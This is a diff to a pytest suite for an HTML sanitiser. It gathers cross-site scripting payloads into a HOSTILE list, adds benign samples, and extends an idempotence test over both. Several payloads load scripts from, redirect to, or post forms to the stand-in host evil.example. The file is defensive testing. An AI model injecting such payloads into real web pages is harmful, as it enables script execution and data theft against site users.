@@ -15,26 +15,42 @@ from __future__ import annotations
 import pytest
 from app.communications.sanitise import ALLOWED, href_is_safe, sanitise_html
 
+#: THE CORPUS. One list, so a payload added for one property is checked by all of them — including
+#: the idempotence property below, which would otherwise be a hand-picked four.
+HOSTILE = [
+    "<script>alert(1)</script>",
+    "<script src='https://evil.example/x.js'></script>",
+    '<p onclick="alert(1)">hi</p>',
+    "<p onerror=alert(1)>hi</p>",
+    '<p style="color:red">hi</p>',
+    '<p class="leak">hi</p>',
+    "<img src=x onerror=alert(1)>",
+    "<iframe src='https://evil.example'></iframe>",
+    "<svg/onload=alert(1)>",
+    "<object data='x'></object>",
+    "<style>p{background:url(https://evil.example/t.png)}</style>",
+    "<meta http-equiv='refresh' content='0;url=https://evil.example'>",
+    "<base href='https://evil.example/'>",
+    "<form action='https://evil.example'><input name='p'></form>",
+]
 
-@pytest.mark.parametrize(
-    "payload",
-    [
-        "<script>alert(1)</script>",
-        "<script src='https://evil.example/x.js'></script>",
-        '<p onclick="alert(1)">hi</p>',
-        "<p onerror=alert(1)>hi</p>",
-        '<p style="color:red">hi</p>',
-        '<p class="leak">hi</p>',
-        "<img src=x onerror=alert(1)>",
-        "<iframe src='https://evil.example'></iframe>",
-        "<svg/onload=alert(1)>",
-        "<object data='x'></object>",
-        "<style>p{background:url(https://evil.example/t.png)}</style>",
-        "<meta http-equiv='refresh' content='0;url=https://evil.example'>",
-        "<base href='https://evil.example/'>",
-        "<form action='https://evil.example'><input name='p'></form>",
-    ],
-)
+#: What a processor legitimately writes. Kept beside the hostile payloads because the properties
+#: below have to hold over both: a sanitiser that ate the message would satisfy every "not in".
+BENIGN = [
+    "<p>Hello <strong>Akash</strong>,</p>",
+    "<ul><li>Bank statement<ul><li>Where to get it: your bank</li></ul></li><li>Pay stub</li></ul>",
+    "<p>a<br>b</p>",
+    "<p>5 &lt; 6 &amp; 7 &gt; 2</p>",
+    "<p>&amp;lt;</p>",
+    "<p>caf\u00e9 &#233; &#x69;</p>",
+    "<p>unclosed <strong>bold",
+    "<ul><li>a<li>b</ul>",
+    "<div>kept text</div>",
+    "<p>March statement only, not February.</p>",
+]
+
+
+@pytest.mark.parametrize("payload", HOSTILE)
 def test_nothing_dangerous_survives(payload: str) -> None:
     """ACCEPTANCE 5. The output carries none of it — not disabled, not escaped-into-a-tag: absent.
 
@@ -167,14 +183,23 @@ def test_the_output_nests_even_when_the_input_does_not() -> None:
     assert sanitise_html("<p><strong>a</p></strong>") == "<p><strong>a</strong></p>"
 
 
-def test_sanitising_twice_changes_nothing() -> None:
-    """A draft is saved repeatedly as a processor types. A sanitiser that escaped its own output
-    would turn a bold word into `&lt;strong&gt;` on the second save."""
-    for payload in (
-        "<p>Hello <strong>Akash</strong></p>",
-        "<script>x</script><p>a<br>b</p>",
-        "<div>text</div>",
-        "<p>&amp;lt;</p>",
-    ):
-        once = sanitise_html(payload)
-        assert sanitise_html(once) == once, payload
+@pytest.mark.parametrize("payload", HOSTILE + BENIGN)
+def test_sanitising_twice_changes_nothing(payload: str) -> None:
+    """IDEMPOTENCE, AND IT IS LOAD-BEARING RATHER THAN TIDY (LP-853 review, second round).
+
+    The obvious reason: a draft is saved repeatedly as a processor types, and a sanitiser that
+    escaped its own output would turn a bold word into `&lt;strong&gt;` on the second save.
+
+    THE LOAD-BEARING REASON IS THE EVIDENCE RECORD. `body_as_sent` is `communication.body`, which
+    the send now sanitises; `body_composed` is assembled from the stored body and does NOT pass
+    through here. So `EvidencePublic.was_edited` — "did the processor change the drafted words" —
+    is false only while `sanitise_html(sanitise_html(x)) == sanitise_html(x)`. The day a tag with
+    attributes joins `ALLOWED` and the serialiser reorders or re-escapes anything, every authored
+    send records as edited, and it will read as a fourth instance of the same false-edit bug rather
+    than as a sanitiser change.
+
+    OVER THE WHOLE CORPUS, not a hand-picked few: the two lists above are what every other property
+    in this file is checked against, so a payload added for one reason is checked for this too.
+    """
+    once = sanitise_html(payload)
+    assert sanitise_html(once) == once
